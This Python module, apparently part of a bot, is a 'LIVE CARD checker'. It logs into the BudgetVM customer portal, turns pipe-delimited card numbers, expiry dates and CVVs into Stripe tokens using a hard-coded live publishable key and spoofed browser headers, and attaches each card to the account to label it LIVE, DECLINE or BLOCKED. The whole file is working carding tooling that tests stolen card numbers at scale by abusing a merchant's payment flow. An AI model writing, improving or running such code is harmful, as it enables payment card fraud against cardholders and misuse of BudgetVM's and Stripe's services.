# -*- coding: utf-8 -*-
"""LIVE CARD checker — BudgetVM / Stripe (from test2.py logic)."""
from __future__ import annotations

import asyncio
import logging
import os
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor

import requests

log = logging.getLogger(__name__)

PORTAL_BASE = "https://portal.budgetvm.com"
LIVE_EMAIL = os.getenv("LIVE_LOGIN_EMAIL", "")
LIVE_PASSWORD = os.getenv("LIVE_LOGIN_PASSWORD", "")
LIVE_GID = os.getenv("LIVE_GID", "120828")
LIVE_GUNIQUE = os.getenv("LIVE_GUNIQUE", "client")
STRIPE_PK = os.getenv("STRIPE_PK", "pk_live_7sv0O1D5LasgJtbYpxp9aUbX")
SESSION_MAX_RETRIES = max(5, min(30, int(os.getenv("SESSION_MAX_RETRIES", "15"))))
HTTP_WORKERS = max(10, min(80, int(os.getenv("HTTP_WORKERS", "80"))))

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
)

PORTAL_HEADERS = {
    "Accept": "*/*",
    "Accept-Language": "ar",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "DNT": "1",
    "Origin": PORTAL_BASE,
    "User-Agent": UA,
    "X-Requested-With": "XMLHttpRequest",
    "sec-ch-ua": '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
}

_executor: ThreadPoolExecutor | None = None
_registry_lock = threading.Lock()
_user_ctx: dict[int, "UserLiveCtx"] = {}
_user_async_locks: dict[int, asyncio.Lock] = {}


class UserLiveCtx:
    __slots__ = ("user_id", "http", "thread_lock", "valid", "failures")

    def __init__(self, user_id: int):
        self.user_id = user_id
        self.http: requests.Session | None = None
        self.thread_lock = threading.Lock()
        self.valid = False
        self.failures = 0


def _get_executor() -> ThreadPoolExecutor:
    global _executor
    if _executor is None:
        _executor = ThreadPoolExecutor(max_workers=HTTP_WORKERS, thread_name_prefix="live")
    return _executor


async def run_blocking(fn, *args):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(_get_executor(), fn, *args)


def _get_ctx(user_id: int) -> UserLiveCtx:
    with _registry_lock:
        if user_id not in _user_ctx:
            _user_ctx[user_id] = UserLiveCtx(user_id)
        return _user_ctx[user_id]


def _get_async_lock(user_id: int) -> asyncio.Lock:
    if user_id not in _user_async_locks:
        _user_async_locks[user_id] = asyncio.Lock()
    return _user_async_locks[user_id]


def _portal_headers(referer: str) -> dict:
    return {**PORTAL_HEADERS, "Referer": referer}


def _validate_ctx(ctx: UserLiveCtx) -> bool:
    with ctx.thread_lock:
        if ctx.http is None:
            return False
        token = ctx.http.cookies.get("ePortalv1")
        if not token:
            ctx.valid = False
            return False
        ctx.valid = True
        return True


def _login_ctx(ctx: UserLiveCtx) -> bool:
    if not LIVE_EMAIL or not LIVE_PASSWORD:
        log.error("LIVE_LOGIN_EMAIL / LIVE_LOGIN_PASSWORD missing")
        return False

    with ctx.thread_lock:
        ctx.http = requests.Session()
        ctx.valid = False

        try:
            login_resp = ctx.http.post(
                f"{PORTAL_BASE}/auth/login",
                headers=_portal_headers(f"{PORTAL_BASE}/auth/login"),
                data={"email": LIVE_EMAIL, "password": LIVE_PASSWORD},
                timeout=30,
            )
            time.sleep(0.5)

            if not ctx.http.cookies.get("ePortalv1"):
                log.error("user %s LIVE login — no ePortalv1", ctx.user_id)
                return False

            ask_resp = ctx.http.post(
                f"{PORTAL_BASE}/auth/googleAsk",
                headers=_portal_headers(f"{PORTAL_BASE}/auth/login"),
                data={
                    "gEmail": LIVE_EMAIL,
                    "gUniqueask": LIVE_GUNIQUE,
                    "gIdask": LIVE_GID,
                    "setup": "2",
                    "email": LIVE_EMAIL,
                    "gUnique": LIVE_GUNIQUE,
                    "gid": LIVE_GID,
                },
                timeout=30,
            )

            try:
                ask_json = ask_resp.json()
            except Exception:
                log.error("user %s googleAsk bad response: %s", ctx.user_id, ask_resp.text[:200])
                return False

            if ask_json.get("success") is not True:
                log.error("user %s googleAsk failed: %s", ctx.user_id, ask_json)
                return False

            ctx.valid = True
            ctx.failures = 0
            log.info("user %s LIVE session OK", ctx.user_id)
            return True

        except Exception as exc:
            log.exception("user %s LIVE login error: %s", ctx.user_id, exc)
            return False


def invalidate_user_session(user_id: int) -> None:
    ctx = _get_ctx(user_id)
    with ctx.thread_lock:
        ctx.valid = False
        ctx.http = None
        ctx.failures += 1


def _check_card_sync(ctx: UserLiveCtx, card: str) -> tuple[str, str]:
    parts = card.strip().split("|")
    if len(parts) != 4:
        return card, "ERROR"

    cc, mm, yy, cvv = parts
    session = ctx.http
    if not session:
        return card, "ERROR"

    muid = str(uuid.uuid4())
    sid = str(uuid.uuid4())
    guid = str(uuid.uuid4())

    stripe_data = (
        f"time_on_page=23221&pasted_fields=cvc%2Cemail%2Cnumber"
        f"&guid={guid}&muid={muid}&sid={sid}&key={STRIPE_PK}"
        f"&payment_user_agent=stripe.js%2F78ef418"
        f"&card[name]=&card[address_line1]=111+North+Street&card[address_line2]="
        f"&card[address_city]=Napoleon&card[address_state]=NY&card[address_zip]=10003"
        f"&card[number]={cc}&card[exp_month]={mm}&card[exp_year]={yy}&card[cvc]={cvv}"
    )

    stripe_resp = session.post(
        "https://api.stripe.com/v1/tokens",
        headers={
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": UA,
        },
        data=stripe_data,
        timeout=30,
    )

    try:
        stripe_json = stripe_resp.json()
    except Exception:
        return card, "ERROR"

    token_id = stripe_json.get("id")
    if not token_id:
        return card, "ERROR"

    card_resp = session.post(
        f"{PORTAL_BASE}/MyGateway/Stripe/cardAdd",
        headers=_portal_headers(f"{PORTAL_BASE}/MyAccount/MyBilling"),
        data={"stripeToken": token_id},
        timeout=30,
    )

    try:
        resp_json = card_resp.json()
    except Exception:
        return card, "ERROR"

    if resp_json.get("success") is True:
        return card, "LIVE"

    result = (resp_json.get("result") or "").lower()
    if "does not support" in result:
        return card, "BLOCKED"
    if "declined" in result:
        return card, "DECLINE"
    return card, "ERROR"


async def _ensure_unlocked(user_id: int, stats: dict) -> bool:
    for attempt in range(SESSION_MAX_RETRIES):
        if not stats.get("is_running", True):
            return False
        stats["last_response"] = f"session_retry:{attempt + 1}"
        ctx = _get_ctx(user_id)

        if await run_blocking(_validate_ctx, ctx):
            return True

        invalidate_user_session(user_id)
        if await run_blocking(_login_ctx, _get_ctx(user_id)):
            return True

        log.warning("user %s LIVE session retry %d/%d", user_id, attempt + 1, SESSION_MAX_RETRIES)
        await asyncio.sleep(1.0 + attempt * 0.4)

    return False


async def ensure_user_session(user_id: int, stats: dict) -> bool:
    async with _get_async_lock(user_id):
        return await _ensure_unlocked(user_id, stats)


async def check_card(card: str, user_id: int, stats: dict, check_seq: int) -> tuple[str, str]:
    if not stats.get("is_running") or stats.get("check_seq") != check_seq:
        return card, "STOPPED"

    async with _get_async_lock(user_id):
        ctx = _get_ctx(user_id)
        if not ctx.valid or not await run_blocking(_validate_ctx, ctx):
            invalidate_user_session(user_id)
            if not await _ensure_unlocked(user_id, stats):
                stats["last_response"] = "guid_error"
                return card, "ERROR"
            ctx = _get_ctx(user_id)

        result = await run_blocking(_check_card_sync, ctx, card)

        if result[1] == "ERROR" and stats.get("check_seq") == check_seq:
            invalidate_user_session(user_id)

        return result
